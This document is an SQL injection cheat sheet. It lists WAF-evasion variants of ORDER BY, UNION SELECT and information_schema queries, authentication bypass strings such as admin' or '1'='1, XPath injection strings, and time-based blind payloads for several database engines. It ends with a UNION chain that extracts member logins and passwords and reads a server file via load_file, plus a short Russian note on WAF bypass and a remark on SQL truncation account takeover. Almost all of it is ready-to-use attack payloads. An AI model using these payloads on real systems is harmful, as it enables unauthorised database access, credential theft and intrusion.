```sql
ORDER BY —>
/*!50000Order*/by
/*!50000order*//*!50000by*/
/*!50000OrdeR*/By
/*!50000ORDER*//*!50000BY*/
/**A**/Order by
Order/**A**/By
/**/**/ORDER/**/BY/**/**/
Null' order by
O0x72der b0x7920
Union—>
/*!50000union select
/*!50000Union*//*!50000Select*/
/*!12345union*//*!12345select*/
/**A**/union select
union /**A**/ select
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
%23%0AUnion%23aaaaaaaaaa%0ASelect%23%0A1
+?UnI?On?+'SeL?ECT?
group_concat—>
group_concat(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
unhex(hex(group_concat(table_name)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
from table_name—>
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!50000frOm*/+/*!50000information_schema*/%252e/**/columns
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
```

# auth bypass
```sql
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
' or 1]%00
' or '1'='1
" or "1"="1
' or ''='
" or ""="
') or 1=1 or ('
') or 1=1] | //user/password[('')=('
') or 2=1] | //user/node()[('')=('
')] | //./node()[('')=('
')] | //node()[('')=('
') or 1=1] | //user/password[('')=('
')] | //password%00
')]/../*[3][text()!=('
')] | //user/*[1] | a[('
')] | //user/*[2] | a[('
')] | //user/*[3] | a[('
')] | //user/*[4] | a[('
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

```
Часто WAF на сайте душит все попытки провести SQL-инъекцию и не дает нормально воткнуть кавычку и вставить привычный пэйлоад, однако, нехитрыми манипуляциями все же частенько его можно обойти.

Например, добавив управляющие символы (https://x.com/oualilweb/status/1754245617470066755) , типа %00, %0A и др. или вставив математические операции ('AND'1'=1*1 вместо 'AND'1'='1') или добавив специфичные комментарии типа /*!50000%55nIoN*/ /*!50000%53eLeCt*/ и многое другое.
```

```sql
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

SQL Truncation
```
As we see, we got a 200 response as the account was created, and I was able to log in as ‘r3dbuck3t@bucket.com’’. Though I signed up as ‘r3buck3t@bucket.com+++++hacker’’.
```
order by
```sql
id=1 AND 1=2 ORDER BY 5-- -
id=1 AND 1=2 UNION ALL SELECT 1,2,3,4-- -  
id=1 AND 1=2 UNION ALL SELECT 1,version(),null,database()-- - 
id=1 AND 1=2 UNION ALL SELECT null,group_concat(table_name),null,version() from information_schema.tables where table_schema=database()-- - 
id=1 AND 1=2 UNION ALL SELECT null,group_concat(column_name),null,version() from information_schema.columns where table_name=0x6d656d626572-- -  convert member to hex
id=1 AND 1=2 UNION ALL SELECT null,concat_ws(0x3a,member_id,member_login,member_password,member_email),null,version() from member-- - 
id=1 AND 1=2 UNION ALL SELECT 1,2,3,load_file(0x2F6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870)--
```